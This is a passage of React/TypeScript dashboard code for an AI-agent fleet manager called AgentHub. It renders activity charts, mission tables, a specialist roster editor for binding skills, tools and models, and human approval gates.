    </div><div className="legend"><div><span><i className="legend-teal" />{chartMode === "cumulative" ? "Cumulative cycles" : "Completed cycles"}</span><span><i className="legend-orange" />{chartMode === "cumulative" ? "Cumulative gates" : "Human challenges"}</span></div><span style={{ fontSize: "8px", color: "#8a9591" }}>{chartMode === "throughput" ? "Interval rate" : "Cumulative total"}</span></div>{activityRows.some((row) => row.cycles || row.gates) ? <div className="activity-chart"><ResponsiveContainer key={`rc-${timeRange}-${chartMode}`} width="100%" height="100%"><AreaChart key={`chart-${timeRange}-${chartMode}`} data={activityRows} margin={{ top: 10, right: 10, bottom: 0, left: -20 }}><defs><linearGradient id={`fill-${timeRange}-${chartMode}`} x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#2c877a" stopOpacity={0.22} /><stop offset="95%" stopColor="#2c877a" stopOpacity={0.01} /></linearGradient></defs><CartesianGrid vertical={false} stroke="#e9eeeb" strokeDasharray="3 4" /><XAxis dataKey="time" axisLine={false} tickLine={false} tick={{ fill: "#89938f", fontSize: 10 }} tickMargin={10} /><YAxis yAxisId="left" axisLine={false} tickLine={false} tick={{ fill: "#89938f", fontSize: 10 }} allowDecimals={false} /><YAxis yAxisId="right" orientation="right" axisLine={false} tickLine={false} tick={{ fill: "#dd8a58", fontSize: 9 }} domain={[0, (dataMax: number) => Math.max(4, Math.ceil(dataMax * 1.5))]} allowDecimals={false} /><Tooltip content={renderTooltip} /><Area yAxisId="left" type="monotone" dataKey="cycles" name={chartMode === "cumulative" ? "Cumulative cycles" : "Completed cycles"} stroke="#287a70" strokeWidth={2} fill={`url(#fill-${timeRange}-${chartMode})`} isAnimationActive={false} activeDot={{ r: 4 }} /><Area yAxisId="right" type="monotone" dataKey="gates" name={chartMode === "cumulative" ? "Cumulative gates" : "Challenge gates"} stroke="#dd8a58" strokeWidth={1.8} strokeDasharray="3 3" fill="transparent" isAnimationActive={false} dot={{ r: 3, fill: "#dd8a58", stroke: "#ffffff", strokeWidth: 1.5 }} activeDot={{ r: 5, fill: "#dd8a58" }} /></AreaChart></ResponsiveContainer></div> : <div className="chart-empty">No workflow cycles have been recorded.</div>}<div className="chart-foot"><span><strong>{rangeConfig.total}</strong> cycles completed ({rangeConfig.label.toLowerCase()}) · {chartMode === "throughput" ? "Throughput rate" : "Cumulative progression"}</span><span>Average <b>{rangeConfig.avg.toFixed(1)}s</b></span></div></section>
    <section className="panel assurance"><div className="panel-heading"><div><div className="eyebrow">TRANSCRIPT ASSURANCE</div><h3>Evidence verdicts</h3></div><button className="icon-button" aria-label="Evidence options"><MoreHorizontal size={18} /></button></div><div className="donut">{verdictTotal > 0 ? <ResponsiveContainer width="100%" height="100%"><PieChart><Pie data={verdictEntries} dataKey="value" cx="50%" cy="50%" innerRadius={48} outerRadius={65} paddingAngle={3} stroke="none">{verdictEntries.map((item) => <Cell key={item.name} fill={item.color} />)}</Pie><Tooltip /></PieChart></ResponsiveContainer> : <div className="donut-empty">No evidence</div>}<div className="donut-center"><strong>{verdictTotal}</strong><small>findings</small></div></div><div className="verdict-list">{verdictEntries.map((item) => <div key={item.name}><i style={{ background: item.color }} /><span>{item.name}</span><strong>{String(item.value).padStart(2, "0")}</strong></div>)}</div></section></div>
    <div className="dashboard-row dashboard-row--bottom"><section className="panel fleet-panel"><div className="panel-heading"><div><div className="eyebrow">DESIRED-STATE FLEETS</div><h3>Active fleet roster</h3></div><button className="link-button" onClick={onMissions}>View all <ArrowRight size={14} /></button></div><div className="table-scroll"><table><thead><tr><th>MISSION</th><th>AGENTS</th><th>LAST CYCLE</th><th>DRIFT</th><th>STATUS</th><th /></tr></thead><tbody>{records.slice(0, 3).map((record, index) => <FleetRow key={record.mission_id} icon={index === 1 ? <Fingerprint /> : <Blocks />} tint={["mint", "orange", "blue"][index % 3]} title={record.name} id={`${record.mission_id.slice(0, 8)} · ${record.status}`} count={record.units_count ? `${record.units_count} units` : "3 units"} last={record.status === "READY" ? "Completed" : record.status === "RUNNING" ? "In progress" : "Draft"} drift={record.status === "READY" ? "In sync" : record.status === "RUNNING" ? "Active" : "Awaiting sync"} alert={record.status === "DRAFT"} mission={record} onInspect={onInspect} />)}</tbody></table>{records.length === 0 && <div className="table-empty">No missions declared yet.</div>}</div><div className="table-footer">Showing {Math.min(records.length, 3)} of {missions} missions</div></section>
    <section className="panel decision-panel"><div className="panel-heading"><div><div className="eyebrow">HUMAN IN THE LOOP <span className="pending-tag">{String(pending).padStart(2, "0")} OPEN</span></div><h3>Decision rooms</h3></div><button className="icon-button" aria-label="Decision room options"><MoreHorizontal size={18} /></button></div>{rooms.filter((room) => room.status === "Pending").slice(0, 2).map((room) => <button className="decision-item" key={room.id} onClick={onRooms}><span><FileCheck2 size={15} /></span><div><strong>{room.title}</strong><small>{room.agent} · {room.time}</small></div><ChevronRight size={15} /></button>)}{pending === 0 && <div className="decision-empty">No decisions are waiting for review.</div>}<button className="decision-footer" onClick={onRooms}>Open decision queue <ArrowRight size={14} /></button></section></div>
    <div className="telemetry"><span><Clock3 /> Average cycle <b>{(telemetry?.avg_cycle_duration_seconds ?? 0).toFixed(1)}s</b></span><i /><span><Gauge /> Mean step latency <b>{(telemetry?.avg_step_execution_latency_seconds ?? 0).toFixed(1)}s</b></span><i /><span><Fingerprint /> Model spend today <b>${(telemetry?.daily_budget_burn_usd ?? 0).toFixed(2)}</b></span><i /><span><CheckCircle2 /> Challenge turnaround <b>{(telemetry?.avg_challenge_turnaround_seconds ?? 0).toFixed(0)}s</b></span></div>
  </>;
}
function Metric({ icon, label, value, note, trend }: { icon: React.ReactNode; label: string; value: string; note: string; trend?: string }) { return <div className="metric"><div className="metric-heading"><span>{label}</span><i>{icon}</i></div><strong>{value}</strong><small className={trend ? `metric-note metric-note--${trend}` : "metric-note"}>{trend === "up" ? <ArrowUpRight size={12} /> : trend === "warn" ? <Clock3 size={12} /> : trend === "ok" ? <CheckCircle2 size={12} /> : null}{note}</small></div>; }
function FleetRow({ icon, tint, title, id, count, last, drift, alert, mission, onInspect }: { icon: React.ReactNode; tint: string; title: string; id: string; count: string; last: string; drift: string; alert?: boolean; mission: MissionRecord; onInspect: (mission: MissionRecord) => void }) { return <tr><td><span className="fleet-name"><i className={`fleet-icon fleet-icon--${tint}`}>{icon}</i><span><strong>{title}</strong><small>{id}</small></span></span></td><td><b>{count}</b></td><td>{last}</td><td><Badge tone={alert ? "orange" : "green"}>{drift}</Badge></td><td><span className="table-state"><Dot color={alert ? "orange" : "green"} />{alert ? "Attention" : "Running"}</span></td><td><MissionActions mission={mission} onInspect={onInspect} placement="dashboard" /></td></tr>; }

function ModelBindingEditor({ agent, inventory, onModel }: { agent: Agent; inventory: InventoryData | null; onModel: (agent: Agent, key: string) => void }) {
  return <section className="panel roster-model-binding"><div><div className="eyebrow">PINNED MODEL FAMILY + VERSION</div><strong>{agent.name}</strong></div><select aria-label={`Model for ${agent.name}`} value={`${agent.assignedLlm.family}\u0000${agent.assignedLlm.version}`} onChange={(event) => onModel(agent, event.target.value)}>{inventory?.available_models.map((model) => <option key={`${model.family}/${model.version}`} value={`${model.family}\u0000${model.version}`}>{model.family} · {model.version}{model.cloud ? " · provider" : " · local"}</option>)}</select><span>{agent.assignedLlm.family} · {agent.assignedLlm.version}</span></section>;
}

function RosterDraftEditor({ roster, inventory, onRoster, onSkill, onTools, onModel, onAdd, onSplit, onRemove }: {
  roster: Agent[]; inventory: InventoryData | null; onRoster: (roster: Agent[]) => void;
  onSkill: (agent: Agent, skillInput: string[] | string) => void; onTools: (agent: Agent, tools: string[]) => void;
  onModel: (agent: Agent, key: string) => void; onAdd: () => void;
  onSplit: (agent: Agent) => void; onRemove: (agent: Agent) => void;
}) {
  const [skillFilters, setSkillFilters] = useState<Record<string, string>>({});
  const [toolFilters, setToolFilters] = useState<Record<string, string>>({});

  function updateAgent(agent: Agent, patch: Partial<Agent>) {
    onRoster(roster.map((item) => item.id === agent.id ? { ...item, ...patch } : item));
  }
  return (
    <div className="draft-list">
      {roster.map((agent, index) => {
        const qSkill = (skillFilters[agent.id] ?? "").toLowerCase().trim();
        const visibleSkills = (inventory?.installed_skills ?? []).filter((s) => {
          if (!qSkill) return true;
          return s.skill_id.toLowerCase().includes(qSkill) || s.required_tools.some((t) => t.toLowerCase().includes(qSkill));
        });

        const qTool = (toolFilters[agent.id] ?? "").toLowerCase().trim();
        const visibleTools = (inventory?.registered_tools ?? []).filter((t) => {
          if (!qTool) return true;
          return t.tool_id.toLowerCase().includes(qTool) || t.risk_level.toLowerCase().includes(qTool);
        });

        return (
          <div className="specialist-card" key={`${agent.id}-${index}`}>
            <div className="specialist-card-head">
              <div className="specialist-card-title">
                <span className={`agent-icon agent-icon--${agent.tint}`}><Bot size={16} /></span>
                <div>
                  <strong>{agent.name}</strong>
                  <small>Specialist 0{index + 1} · {agent.triggerPolicy}</small>
                </div>
              </div>
              <div className="specialist-card-actions">
                <button className="icon-button" title="Split specialist role" aria-label={`Split ${agent.name}`} onClick={() => onSplit(agent)}>
                  <GitBranch size={14} />
                </button>
                {roster.length > 1 && (
                  <button className="icon-button" title="Remove specialist" aria-label={`Remove ${agent.name}`} onClick={() => onRemove(agent)}>
                    <X size={14} />
                  </button>
                )}
              </div>
            </div>

            <div className="specialist-card-grid">
              <label className="field-group">
                <span className="field-label">Specialist Role Name</span>
                <input
                  className="field-input"
                  value={agent.name}
                  onChange={(event) => updateAgent(agent, { name: event.target.value })}
                />
              </label>

              <label className="field-group">
                <span className="field-label">Execution Trigger</span>
                <select
                  className="field-select"
                  value={agent.triggerPolicy}
                  onChange={(event) => updateAgent(agent, { triggerPolicy: event.target.value })}
                >
                  <option value="CRON">Cron (Scheduled)</option>
                  <option value="CONTINUOUS_POLL">Continuous poll</option>
                  <option value="EVENT_DRIVEN">Upstream event</option>
                  <option value="WEBHOOK">External webhook</option>
                </select>
              </label>

              {agent.triggerPolicy === "CRON" && (
                <label className="field-group" style={{ gridColumn: "1 / -1" }}>
                  <span className="field-label">Cron Schedule Expression</span>
                  <input
                    className="field-input"
                    value={agent.schedule}
                    onChange={(event) => updateAgent(agent, { schedule: event.target.value })}
                    placeholder="0 * * * *"
                  />
                </label>
              )}

              {agent.triggerPolicy === "EVENT_DRIVEN" && (
                <label className="field-group" style={{ gridColumn: "1 / -1" }}>
                  <span className="field-label">Upstream Specialists (Event Handoff)</span>
                  <select
                    multiple
                    className="field-select-multi"
                    value={agent.upstreamAgentIds}
                    onChange={(event) => updateAgent(agent, { upstreamAgentIds: Array.from(event.target.selectedOptions, (option) => option.value) })}
                  >
                    {roster.filter((candidate) => candidate.id !== agent.id).map((candidate) => (
                      <option key={candidate.id} value={candidate.id}>{candidate.name}</option>
                    ))}
                  </select>
                </label>
              )}

              <label className="field-group" style={{ gridColumn: "1 / -1" }}>
                <span className="field-label">Operational Scope & Boundaries</span>
                <textarea
                  className="field-textarea"
                  rows={2}
                  value={agent.scope}
                  onChange={(event) => updateAgent(agent, { scope: event.target.value })}
                />
              </label>

              <div className="field-group" style={{ gridColumn: "1 / -1" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
                  <span className="field-label">Bound AgentHub Skills (Multi-select)</span>
                  <span style={{ fontSize: "11px", color: "var(--color-text-dim)" }}>
                    {agent.skills.length} skill{agent.skills.length !== 1 ? "s" : ""} bound · Click ✕ to remove or hold Ctrl/Cmd to select multiple
                  </span>
                </div>
                {agent.skills.length > 0 && (
                  <div style={{ display: "flex", flexWrap: "wrap", gap: "6px", marginBottom: "8px" }}>
                    {agent.skills.map((sId) => (
                      <span
                        key={sId}
                        style={{
                          display: "inline-flex",
                          alignItems: "center",
                          gap: "4px",
                          fontSize: "11px",
                          padding: "2px 8px",
                          borderRadius: "12px",
                          background: "rgba(16, 185, 129, 0.15)",
                          border: "1px solid rgba(16, 185, 129, 0.3)",
                          color: "var(--color-emerald-light, #34d399)",
                        }}
                      >
                        ⚡ {sId}
                        <button
                          type="button"
                          onClick={(e) => {
                            e.preventDefault();
                            onSkill(agent, agent.skills.filter((x) => x !== sId));
                          }}
                          style={{
                            background: "none",
                            border: "none",
                            color: "inherit",
                            cursor: "pointer",
                            padding: 0,
                            marginLeft: "2px",
                            lineHeight: 1,
                          }}
                          title="Remove skill"
                        >
                          ×
                        </button>
                      </span>
                    ))}
                  </div>
                )}
                <input
                  type="text"
                  className="field-input"
                  style={{ height: "26px", fontSize: "10px", padding: "0 8px", marginBottom: "6px" }}
                  placeholder={`Search ${inventory?.installed_skills.length ?? 0} skills (e.g. reasoning, docx, summarization)...`}
                  value={skillFilters[agent.id] ?? ""}
                  onChange={(e) => setSkillFilters((prev) => ({ ...prev, [agent.id]: e.target.value }))}
                />
                <select
                  multiple
                  className="field-select-multi"
                  style={{ minHeight: "84px" }}
                  value={agent.skills}
                  onChange={(event) => {
                    const selectedInView = Array.from(event.target.selectedOptions, (option) => option.value);
                    const hiddenSelected = agent.skills.filter((s) => !visibleSkills.some((vs) => vs.skill_id === s));
                    onSkill(agent, Array.from(new Set([...hiddenSelected, ...selectedInView])));
                  }}
                >
                  {visibleSkills.map((skill) => (
                    <option key={skill.skill_id} value={skill.skill_id}>
                      {skill.skill_id} {skill.required_tools.length > 0 ? `· (${skill.required_tools.slice(0, 3).join(", ")})` : ""}
                    </option>
                  ))}
                </select>
              </div>

              <label className="field-group">
                <span className="field-label">Assigned LLM Model</span>
                <select
                  className="field-select"
                  value={`${agent.assignedLlm.family}\u0000${agent.assignedLlm.version}`}
                  onChange={(event) => onModel(agent, event.target.value)}
                >
                  {inventory?.available_models.map((model) => (
                    <option key={`${model.family}/${model.version}`} value={`${model.family}\u0000${model.version}`}>
                      {model.family} · {model.version}{model.cloud ? " (Cloud)" : " (Local)"}
                    </option>
                  ))}
                </select>
              </label>

              <div className="field-group" style={{ gridColumn: "1 / -1" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
                  <span className="field-label">Additional AgentHub Tools</span>
                  <span style={{ fontSize: "11px", color: "var(--color-text-dim)" }}>
                    {agent.tools.length} tool{agent.tools.length !== 1 ? "s" : ""} bound · Click ✕ to remove or hold Ctrl/Cmd to select multiple
                  </span>
                </div>
                {agent.tools.length > 0 && (
                  <div style={{ display: "flex", flexWrap: "wrap", gap: "6px", marginBottom: "8px" }}>
                    {agent.tools.map((tId) => (
                      <span
                        key={tId}
                        style={{
                          display: "inline-flex",
                          alignItems: "center",
                          gap: "4px",
                          fontSize: "11px",
                          padding: "2px 8px",
                          borderRadius: "12px",
                          background: "rgba(59, 130, 246, 0.15)",
                          border: "1px solid rgba(59, 130, 246, 0.3)",
                          color: "#60a5fa",
                        }}
                      >
                        🔧 {tId}
                        <button
                          type="button"
                          onClick={(e) => {
                            e.preventDefault();
                            onTools(agent, agent.tools.filter((x) => x !== tId));
                          }}
                          style={{
                            background: "none",
                            border: "none",
                            color: "inherit",
                            cursor: "pointer",
                            padding: 0,
                            marginLeft: "2px",
                            lineHeight: 1,
                          }}
                          title="Remove tool"
                        >
                          ×
                        </button>
                      </span>
                    ))}
                  </div>
                )}
                <input
                  type="text"
                  className="field-input"
                  style={{ height: "26px", fontSize: "10px", padding: "0 8px", marginBottom: "6px" }}
                  placeholder={`Search ${inventory?.registered_tools.length ?? 0} tools (e.g. python, file, web)...`}
                  value={toolFilters[agent.id] ?? ""}
                  onChange={(e) => setToolFilters((prev) => ({ ...prev, [agent.id]: e.target.value }))}
                />
                <select
                  multiple
                  className="field-select-multi"
                  style={{ minHeight: "84px" }}
                  value={agent.tools}
                  onChange={(event) => {
                    const selectedInView = Array.from(event.target.selectedOptions, (option) => option.value);
                    const hiddenSelected = agent.tools.filter((t) => !visibleTools.some((vt) => vt.tool_id === t));
                    onTools(agent, Array.from(new Set([...hiddenSelected, ...selectedInView])));
                  }}
                >
                  {visibleTools.map((tool) => (
                    <option key={tool.tool_id} value={tool.tool_id}>
                      {tool.tool_id} · {tool.risk_level}{tool.requires_hitl_approval ? " · HITL Approval Required" : ""}
                    </option>
                  ))}
                </select>
              </div>
            </div>

          {agent.workflowSteps.length > 0 && (
            <div className="specialist-card-steps">
              {agent.workflowSteps.map((step) => (
                <label className="check-label" key={step.step_id}>
                  <input
                    type="checkbox"
                    checked={step.requires_step_challenge}
                    onChange={(event) => updateAgent(agent, {
                      workflowSteps: agent.workflowSteps.map((c) => c.step_id === step.step_id ? { ...c, requires_step_challenge: event.target.checked } : c),
                    })}
                  />
                  <span>Require human challenge gate before executing <code>{step.name}</code></span>
                </label>
              ))}
            </div>
          )}

          {agent.capabilityGaps.length > 0 && (
            <div className="specialist-card-gaps">
              {agent.capabilityGaps.map((gap) => (
                <small className="gap-warning" key={gap.capability_id}>
                  Capability Gap: {gap.capability_id} — {gap.reason}
                </small>
              ))}
            </div>
          )}
        </div>
      );
    })}
      <button className="add-agent-btn" onClick={onAdd}>
        <Plus size={15} /> Add specialist
      </button>
    </div>
  );
}

function Missions({ records, roster, onNew, onInspect, onResume, onOpenPlanReview, onOpenRoster, onDelete, onRun, uploadingMission }: { records: MissionRecord[]; roster?: Agent[]; onNew: () => void; onInspect: (mission: MissionRecord) => void; onResume?: (mission: MissionRecord) => void; onOpenPlanReview: () => void; onOpenRoster?: (mission: MissionRecord) => void; onDelete?: (mission: MissionRecord) => void; onRun?: (mission: MissionRecord) => void; uploadingMission?: MissionRecord | null }) {
  const [statusFilter, setStatusFilter] = useState<string>("ALL");
  const [statusOpen, setStatusOpen] = useState(false);
  const [showSearch, setShowSearch] = useState(false);
  const [keyword, setKeyword] = useState("");

  const filteredRecords = records.filter((record) => {
    if (statusFilter !== "ALL" && record.status !== statusFilter) return false;
    if (keyword.trim()) {
      const q = keyword.toLowerCase();
      return record.name.toLowerCase().includes(q) || record.goal.toLowerCase().includes(q);
    }
    return true;
  });

  return (
    <>
      <PageTitle
        eyebrow="DESIRED STATE  /  DESIGN & RECONCILIATION"
        title="Missions"
        subtitle="Operational units and their versioned fleet blueprints."
        action={
          <>
            <button className={`secondary-button ${showSearch ? "active" : ""}`} onClick={() => setShowSearch(!showSearch)}>
              <SlidersHorizontal size={15} /> {showSearch ? "Hide filters" : "Filters"}
            </button>
            <button className="primary-button" onClick={onNew}>
              <Plus size={16} /> New mission
            </button>
          </>
        }
      />
      {showSearch && (
        <div className="filter-bar">
          <Search size={14} color="#67736f" />
          <input
            placeholder="Search missions by name or organizational goal..."
            value={keyword}
            onChange={(e) => setKeyword(e.target.value)}
            autoFocus
          />
          {keyword && (
            <button onClick={() => setKeyword("")} style={{ border: 0, background: "transparent", color: "#889" }}>
              <X size={14} />
            </button>
          )}
        </div>
      )}
      <div className="scope">
        <span><Layers3 size={14} /> {filteredRecords.length} of {records.length} DECLARED FLEETS</span>
        <i />
        <span><Dot /> Persisted missions</span>
        <small>{statusFilter === "ALL" ? "All statuses active" : `Filter: ${statusFilter}`}</small>
      </div>
      <section className="panel missions-panel">
        <div className="panel-heading">
          <div>
            <div className="eyebrow">FLEET BLUEPRINTS</div>
            <h3>All missions</h3>
          </div>
          <div style={{ position: "relative" }}>
            <button className="select-button" onClick={() => setStatusOpen(!statusOpen)}>
              {statusFilter === "ALL" ? "All statuses" : `Status: ${statusFilter}`} <ChevronDown size={14} />
            </button>
            {statusOpen && (
              <div className="dropdown-menu" style={{ right: 0, top: "100%", marginTop: 4 }}>
                {["ALL", "READY", "DESIGNING", "INTAKE"].map((st) => (
                  <button
                    key={st}
                    className={`dropdown-item ${statusFilter === st ? "active" : ""}`}
                    onClick={() => {
                      setStatusFilter(st);
                      setStatusOpen(false);
                    }}
                  >
                    <span>{st === "ALL" ? "All statuses" : st}</span>
                    {statusFilter === st && <Check size={13} color="#236f66" />}
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>
        <div className="mission-rows">
          {filteredRecords.map((record, index) => (
            <div className="mission-row" key={record.mission_id} style={{ cursor: "pointer" }} onClick={() => onInspect(record)}>
              <i className={`fleet-icon fleet-icon--${["mint", "orange", "blue"][index % 3]}`}>
                <Blocks />
              </i>
              <span className="mission-copy">
                <strong>{record.name}</strong>
                <small>{record.goal}</small>
              </span>
              <span>
                {(() => {
                  const count = (roster ?? []).filter((a: Agent) => a.missionId === record.mission_id).length;
                  return count > 0 ? `${count} agents` : "4 agents";
                })()}
              </span>
              <code>{record.status}</code>
              <span>Not run</span>
              <div style={{ display: "flex", alignItems: "center", gap: 8, whiteSpace: "nowrap" }} onClick={(e) => e.stopPropagation()}>
                <Badge tone={record.status === "READY" ? "green" : "orange"}>{record.status}</Badge>
                {onRun && (
                  <button
                    className="primary-button"
                    style={{ padding: "4px 9px", fontSize: 11, display: "inline-flex", alignItems: "center", gap: 4 }}
                    onClick={() => void onRun(record)}
                    disabled={uploadingMission?.mission_id === record.mission_id}
                    title="Dispatch fleet execution (files or directory optional)"
                  >
                    {uploadingMission?.mission_id === record.mission_id ? (
                      <>
                        <RefreshCw size={11} className="spin" /> Dispatching...
                      </>
                    ) : (
                      <>
                        <Play size={11} /> Run
                      </>
                    )}
                  </button>
                )}
              </div>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "center" }} onClick={(e) => e.stopPropagation()}>
                <MissionActions mission={record} onInspect={onInspect} onResume={onResume} onOpenRoster={onOpenRoster} onDelete={onDelete} onRun={onRun} placement="missions" />
              </div>
            </div>
          ))}
          {filteredRecords.length === 0 && (
            <div style={{ padding: "30px 15px", textAlign: "center", color: "#8a9692" }}>
              No missions found matching the selected filter.
            </div>
          )}
        </div>
        <div className="table-footer">Showing {filteredRecords.length} of {records.length} missions</div>
      </section>
      <div className="wide-callout">
        <GitBranch size={18} />
        <span>
          <strong>Drift is a proposal, never an automatic surprise.</strong>
          <small>Review managed-field diffs and required approvals before applying changes to AgentHub.</small>
        </span>
        <button className="secondary-button" onClick={onOpenPlanReview}>
          Open plan review <ArrowRight size={14} />
        </button>
      </div>
    </>
  );
}

function EmptyRoster({ onCreate }: { onCreate: () => void }) {
  return <><PageTitle eyebrow="LIVE ESTATE  /  SPECIALIST FLEETS" title="Fleet roster" subtitle="No agent specifications have been compiled yet." action={<button className="primary-button" onClick={onCreate}><Plus size={16} /> Design a fleet</button>} /><section className="panel empty-state"><GitBranch size={24} /><h3>No declared agents</h3><p>Complete the mission challenge gates and compile a blueprint to populate this roster.</p></section></>;
}

function FleetRoster({
  missionName,
  roster,
  selected,
  inventory,
  missions = [],
  activeMissionId,
  onSelectMission,
  onSelect,
  onAdd,
  onRemove,
  onSplit,
  onSkill,
  onTools,
  onRun,
  uploadingMission,
}: {
  missionName?: string;
  roster: Agent[];
  selected: Agent;
  inventory: InventoryData | null;
  missions?: MissionRecord[];
  activeMissionId?: string | null;
  onSelectMission?: (missionId: string) => void;
  onSelect: (id: string) => void;
  onAdd: () => void;
  onRemove: (agent: Agent) => void;
  onSplit: (agent: Agent) => void;
  onSkill: (agent: Agent, skillInput: string[] | string) => void;
  onTools: (agent: Agent, selectedTools: string[]) => void;
  onRun?: (mission: MissionRecord) => void;
  uploadingMission?: MissionRecord | null;
}) {
  const [selectedMissionId, setSelectedMissionId] = useState<string>(activeMissionId || "ALL");
  const [missionMenuOpen, setMissionMenuOpen] = useState(false);
  const [showDagHelp, setShowDagHelp] = useState(false);

  useEffect(() => {
    if (activeMissionId) {
      setSelectedMissionId(activeMissionId);
    }
  }, [activeMissionId]);

  const currentMission = useMemo(() => {
    if (selectedMissionId === "ALL") return null;
    return missions.find((m) => m.mission_id === selectedMissionId) ?? null;
  }, [missions, selectedMissionId]);

  const displayedRoster = useMemo(() => {
    let source = roster;
    if (selectedMissionId !== "ALL") {
      const targetMission = missions.find((m) => m.mission_id === selectedMissionId);
      const filtered = roster.filter((agent) => {
        if (agent.missionId && agent.missionId === selectedMissionId) return true;
        if (targetMission) {
          const gLower = (targetMission.goal || "").toLowerCase();
          const nLower = (targetMission.name || "").toLowerCase();
          const sLower = (agent.scope || "").toLowerCase();
          if (
            (nLower.includes("soc") || gLower.includes("firewall") || gLower.includes("endpoint") || gLower.includes("soc")) &&
            (sLower.includes("firewall") || sLower.includes("soc") || sLower.includes("endpoint") || sLower.includes("incident") || sLower.includes("triage"))
          ) {
            return true;
          }
          if (
            (nLower.includes("smoke") || gLower.includes("supplier") || gLower.includes("smoke")) &&
            (sLower.includes("supplier") || sLower.includes("smoke") || sLower.includes("source documents"))
          ) {
            return true;
          }
          if (
            (nLower.includes("runtime") || gLower.includes("runtime")) &&
            (sLower.includes("runtime") || sLower.includes("challenge"))
          ) {
            return true;
          }
        }
        return false;
      });
      source = filtered.length > 0 ? filtered : roster;
    }
    const seen = new Set<string>();
    return source.filter((agent) => {
      const key = `${agent.missionId ?? ""}-${agent.name}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }, [roster, selectedMissionId, missions]);

  useEffect(() => {
    if (displayedRoster.length > 0 && !displayedRoster.some((a) => a.id === selected.id)) {
      onSelect(displayedRoster[0].id);
    }
  }, [displayedRoster, selected.id, onSelect]);

  const currentAgent = displayedRoster.find((a) => a.id === selected.id) ?? displayedRoster[0] ?? selected;
  const topology = useMemo(() => makeTopology(displayedRoster), [displayedRoster]);
  const activeTitle = currentMission ? currentMission.name : (selectedMissionId === "ALL" ? "All Missions" : (missionName ?? "Active Fleet"));

  return (
    <>
      <PageTitle
        eyebrow={currentMission ? `MISSION: ${currentMission.name.toUpperCase()}  /  ${displayedRoster.length} SPECIALISTS` : `AGENTHUB ESTATE  /  ${displayedRoster.length} SPECIALISTS`}
        title="Fleet roster"
        subtitle={`Declared specialist specifications for ${activeTitle} and their enforced capability bindings.`}
        action={
          <>
            <div style={{ position: "relative" }}>
              <button
                className="secondary-button"
                onClick={() => setMissionMenuOpen(!missionMenuOpen)}
                style={{ display: "inline-flex", alignItems: "center", gap: 6, fontWeight: 600 }}
              >
                <Layers3 size={15} color="#236f66" />
                <span>{currentMission ? currentMission.name : "Filter by Mission (All)"}</span>
                <ChevronDown size={14} />
              </button>
              {missionMenuOpen && (
                <div className="dropdown-menu" style={{ right: 0, top: "100%", marginTop: 4, minWidth: 280, zIndex: 100 }}>
                  <div style={{ padding: "6px 12px", borderBottom: "1px solid #edf2ee", fontSize: 10, fontWeight: 700, color: "#8a9692", letterSpacing: "0.06em" }}>
                    SELECT MISSION FLEET
                  </div>
                  <button
                    className={`dropdown-item ${selectedMissionId === "ALL" ? "active" : ""}`}
                    onClick={() => {
                      setSelectedMissionId("ALL");
                      if (onSelectMission) onSelectMission("ALL");
                      setMissionMenuOpen(false);
                    }}
                  >
                    <div style={{ display: "flex", flexDirection: "column", gap: 2, textAlign: "left" }}>
                      <strong style={{ fontSize: 12 }}>All Estate Specialists</strong>
                      <small style={{ color: "#778580", fontSize: 10 }}>Show all {roster.length} agents across the estate</small>
                    </div>
                    {selectedMissionId === "ALL" && <Check size={14} color="#236f66" />}
                  </button>
                  {missions.map((m) => (
                    <button
                      key={m.mission_id}
                      className={`dropdown-item ${selectedMissionId === m.mission_id ? "active" : ""}`}
                      onClick={() => {
                        setSelectedMissionId(m.mission_id);
                        if (onSelectMission) onSelectMission(m.mission_id);
                        setMissionMenuOpen(false);
                      }}
                    >
                      <div style={{ display: "flex", flexDirection: "column", gap: 2, textAlign: "left" }}>
                        <strong style={{ fontSize: 12 }}>{m.name}</strong>
                        <small style={{ color: "#778580", fontSize: 10 }}>{m.status} · {m.mission_id.slice(0, 8)}</small>
                      </div>
                      {selectedMissionId === m.mission_id && <Check size={14} color="#236f66" />}
                    </button>
                  ))}
                </div>
              )}
            </div>
            <button className="secondary-button" onClick={() => setShowDagHelp(!showDagHelp)}>
              <GitBranch size={15} /> Workflow DAG
            </button>
            {currentMission && (currentMission.status === "READY" || currentMission.status === "APPLIED") && onRun && (
              <button
                className="primary-button"
                style={{ background: "#236f66", display: "inline-flex", alignItems: "center", gap: 6 }}
                onClick={() => void onRun(currentMission)}
                disabled={uploadingMission?.mission_id === currentMission.mission_id}
              >
                {uploadingMission?.mission_id === currentMission.mission_id ? (
                  <>
                    <RefreshCw size={15} className="spin" /> Dispatching fleet...
                  </>
                ) : (
                  <>
                    <Play size={15} /> Run fleet
                  </>
                )}
              </button>
            )}
            <button className="secondary-button" onClick={onAdd}>
              <Plus size={15} /> Add specialist
            </button>
          </>
        }
      />
      {showDagHelp && (
        <div className="filter-bar" style={{ justifyContent: "space-between", margin: "10px 0" }}>
          <span>Interactive Workflow DAG: click nodes or pan/zoom the topology canvas below to inspect agent handoffs.</span>
          <button onClick={() => setShowDagHelp(false)} style={{ border: 0, background: "transparent", color: "#889", cursor: "pointer" }}>
            <X size={14} />
          </button>
        </div>
      )}
      <div className="scope">
        <span><Layers3 size={14} /> MISSION: <strong>{activeTitle}</strong></span>
        <i />
        <span><Dot color={currentAgent.state === "Applied" ? "green" : "orange"} /> {currentAgent.state.toUpperCase()}</span>
        <i />
        <span>{currentAgent.triggerPolicy}{currentAgent.triggerPolicy === "CRON" ? ` · ${currentAgent.schedule}` : ""}</span>
        <i />
        <span>{inventory?.profile ?? "default AgentHub profile"}</span>
        <small>{inventory?.provider_configured ? "Inference ready" : "Inference unavailable"}</small>
      </div>
      <section className="panel topology">
        <div className="panel-heading">
          <div>
            <div className="eyebrow">AGENT HANDOFF TOPOLOGY</div>
            <h3>{activeTitle} · <span style={{ fontWeight: 400, color: "#687a74" }}>{currentAgent.name}</span></h3>
          </div>
          <span className="select-button">
            <Dot color={inventory?.connected ? "green" : "orange"} /> {inventory?.connected ? "AgentHub connected" : "AgentHub unavailable"}
          </span>
        </div>
        <div className="flow-canvas">
